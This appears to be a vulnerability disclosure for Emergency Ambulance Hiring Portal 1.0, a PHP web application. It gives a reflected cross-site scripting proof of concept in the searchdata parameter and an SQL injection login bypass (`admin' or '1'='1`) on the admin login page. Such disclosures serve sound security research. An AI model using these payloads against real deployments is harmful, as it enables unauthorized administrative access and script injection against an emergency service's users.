# Emergency Ambulance Hiring Portal - Cross-Site Scripting
+ Exploit Title:Emergency Ambulance Hiring Portal - Cross-Site Scripting
+ Exploit Author: zihe
+ Vendor Homepage: https://phpgurukul.com/emergency-ambulance-hiring-portal-using-php-and-mysql/
+ Software Link: https://phpgurukul.com/?sdm_process_download=1&download_id=18972
+ Version: 1.0
+ Tested on: Windows 10 Pro + PHP 5.6.9, Nginx 1.15.11, Mysql 5.7.26
+ CVE: Reported, waiting for CVE number.

## Description:
Emergency Ambulance Hiring Portal 1.0 is vulnerable to cross-site scripting via the `searchdata` parameter at ambulance-tracking.php

## Proof of Concept:

Go to this address: "http://eahp/ambulance-tracking.php"

searchdata : `<script>alert('zihe');</script>`

Cross-Site Scripting Successful!

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/b090cb25-ae5f-4949-8986-578fef273e87)

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/7c725f66-5461-485f-bc8e-2324b17a025b)


# Emergency Ambulance Hiring Portal - Login Sqlinjection:

## Description:
Emergency Ambulance Hiring Portal 1.0 is vulnerable to Sqlinjection via the `username` and `password` parameter at admin/login.php

## Proof of Concept:

Go to this address: "http://eahp/admin/login.php"

username : `admin' or '1'='1`
password : `anyword`

Sqlinjection Successful!

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/78392570-0e7d-4c55-80f2-e6a9f60c2be8)

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/7015b41d-3a73-45a9-b284-c50237b08b9b)

